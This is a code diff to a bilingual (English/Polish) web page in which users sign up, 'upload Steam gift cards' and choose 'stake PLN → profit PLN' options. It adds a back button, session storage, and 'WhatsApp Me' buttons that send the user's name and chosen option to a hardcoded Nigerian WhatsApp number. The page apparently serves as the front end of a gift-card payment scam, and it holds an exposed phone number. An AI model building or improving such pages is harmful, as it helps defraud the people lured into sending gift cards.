@@ -31,6 +31,7 @@
   .notif{position:fixed;left:20px;bottom:20px;padding:12px;border-radius:10px;background:#052e13;color:#c9f6de;border:1px solid #0a4a23}
   img.preview{max-width:100%;height:120px;object-fit:cover;border-radius:8px;border:1px solid #222}
   .small-muted{font-size:12px;color:var(--muted)}
+  #backHomeBtn {margin-top:16px;width:100%;text-align:center;background:#1f2937;border:1px solid var(--border);}
 </style>
 </head>
 <body>
@@ -123,6 +124,7 @@
         <div id="meBalance" style="font-weight:700;font-size:18px">0.00 PLN</div>
       </div>
     </div>
+    <button id="backHomeBtn" class="btn">⬅ Back to Home</button>
   </div>
 </div>
 
@@ -143,56 +145,21 @@ const options = [
 ];
 
 const translations = {
-  en: {
-    welcome: "Welcome — Signup / Login (US & Poland only)",
-    country: "Country",
-    language: "Language",
-    name: "Name",
-    phone: "Phone",
-    sendCode: "Send code",
-    notSent: "Not sent",
-    enterCode: "Enter code",
-    finishLogin: "Finish login",
-    uploadCard: "Upload a card",
-    uploadDesc: "United States & Poland only — Steam gift card uploads only.",
-    chooseMethod: "Choose method you want to earn:",
-    balance: "Balance",
-    myAccount: "My Account",
-    alertCountry: "Only Poland and United States allowed",
-    alertMissing: "Enter name + phone",
-    loginSuccess: "Login success",
-    loggedOut: "Logged out"
-  },
-  pl: {
-    welcome: "Witamy — Rejestracja / Logowanie (tylko USA i Polska)",
-    country: "Kraj",
-    language: "Język",
-    name: "Imię",
-    phone: "Telefon",
-    sendCode: "Wyślij kod",
-    notSent: "Nie wysłano",
-    enterCode: "Wpisz kod",
-    finishLogin: "Zakończ logowanie",
-    uploadCard: "Prześlij kartę",
-    uploadDesc: "Tylko USA i Polska — tylko karty podarunkowe Steam.",
-    chooseMethod: "Wybierz metodę zarabiania:",
-    balance: "Saldo",
-    myAccount: "Moje konto",
-    alertCountry: "Dozwolone tylko Polska i Stany Zjednoczone",
-    alertMissing: "Wpisz imię i telefon",
-    loginSuccess: "Logowanie zakończone sukcesem",
-    loggedOut: "Wylogowano"
-  }
+  en: { welcome:"Welcome — Signup / Login (US & Poland only)", country:"Country", language:"Language", name:"Name", phone:"Phone", sendCode:"Send code", notSent:"Not sent", enterCode:"Enter code", finishLogin:"Finish login", uploadCard:"Upload a card", uploadDesc:"United States & Poland only — Steam gift card uploads only.", chooseMethod:"Choose method you want to earn:", balance:"Balance", myAccount:"My Account", backHome:"⬅ Back to Home", alertCountry:"Only Poland and United States allowed", alertMissing:"Enter name + phone", loginSuccess:"Login success", loggedOut:"Logged out" },
+  pl: { welcome:"Witamy — Rejestracja / Logowanie (tylko USA i Polska)", country:"Kraj", language:"Język", name:"Imię", phone:"Telefon", sendCode:"Wyślij kod", notSent:"Nie wysłano", enterCode:"Wpisz kod", finishLogin:"Zakończ logowanie", uploadCard:"Prześlij kartę", uploadDesc:"Tylko USA i Polska — tylko karty podarunkowe Steam.", chooseMethod:"Wybierz metodę zarabiania:", balance:"Saldo", myAccount:"Moje konto", backHome:"⬅ Powrót do strony głównej", alertCountry:"Dozwolone tylko Polska i Stany Zjednoczone", alertMissing:"Wpisz imię i telefon", loginSuccess:"Logowanie zakończone sukcesem", loggedOut:"Wylogowano" }
 };
 
 const stateKey = "demo_safe_users";
-let users = JSON.parse(localStorage.getItem(stateKey) || "{}");
-let currentUser = null;
+const sessionKey = "demo_safe_session";
 
-// 🔹 YOUR WhatsApp number (Nigeria)
-const whatsappNumber = "2348108462471";
+let users = JSON.parse(localStorage.getItem(stateKey) || "{}");
+let currentUser = JSON.parse(localStorage.getItem(sessionKey) || "null");
+const whatsappNumber = "2348108462471"; // ✅ Your WhatsApp number in international format
 
 function saveUsers(){ localStorage.setItem(stateKey, JSON.stringify(users)); }
+function saveSession(){ localStorage.setItem(sessionKey, JSON.stringify(currentUser)); }
+function clearSession(){ localStorage.removeItem(sessionKey); }
+
 const el = id => document.getElementById(id);
 const show = id => el(id).classList.remove("hidden");
 const hide = id => el(id).classList.add("hidden");
@@ -212,7 +179,7 @@ function updateLanguage(lang){
   el("home").querySelector(".small-muted").textContent = translations[lang].uploadDesc;
   document.querySelector("#home .small-muted").nextElementSibling.previousElementSibling.textContent = translations[lang].balance;
   el("meCard").querySelector("h1").textContent = translations[lang].myAccount;
-  el("meCard").querySelector(".small-muted").textContent = translations[lang].balance;
+  el("backHomeBtn").textContent = translations[lang].backHome;
 }
 
 function updateUI(){
@@ -233,7 +200,7 @@ function renderOptions(){
     const div = document.createElement('div'); div.className='option';
     div.innerHTML = `<h3>${opt.stake} PLN → ${opt.profit} PLN</h3>
       <div class="small-muted">Upload Steam gift card to receive ${opt.profit} PLN</div>
-      <button class="btn" data-id="${opt.id}">Select</button>`;
+      <button class="btn" data-id="${opt.id}">💬 WhatsApp Me</button>`;
     list.appendChild(div);
   });
 }
@@ -245,7 +212,7 @@ document.addEventListener('click', (e)=>{
     const opt = options.find(o=>o.id===id);
     if(opt && currentUser){
       currentUser.selectedOption = opt;
-      notif(`Opening WhatsApp with option ${opt.stake} → ${opt.profit}`);
+      saveSession();
       const message = `Hello, my name is ${currentUser.name}. I want to select the option ${opt.stake} PLN → ${opt.profit} PLN.`;
       const url = `https://wa.me/${whatsappNumber}?text=${encodeURIComponent(message)}`;
       window.open(url, "_blank");
@@ -286,16 +253,24 @@ el('finishSignup').addEventListener('click', ()=>{
   const lang = el('lang').value;
   const code = el('code').value.trim();
   if(!currentUser || code !== currentUser.pendingCode){ alert('Invalid code'); return; }
-  delete currentUser.pendingCode; users[currentUser.phone]=currentUser; saveUsers();
+  delete currentUser.pendingCode; 
+  users[currentUser.phone]=currentUser; 
+  saveUsers();
+  saveSession(); 
   notif(translations[lang].loginSuccess); updateUI();
 });
 
 el('meBtn').addEventListener('click', ()=>{ hide('home'); show('meCard'); });
+el('backHomeBtn').addEventListener('click', ()=>{ hide('meCard'); show('home'); });
 el('logoutBtn').addEventListener('click', ()=>{
   const lang = el('lang').value;
-  currentUser=null; updateUI(); notif(translations[lang].loggedOut);
+  currentUser=null; 
+  clearSession();
+  updateUI(); 
+  notif(translations[lang].loggedOut);
 });
 
+updateLanguage(el("lang").value);
 updateUI();
 </script>
 </body>
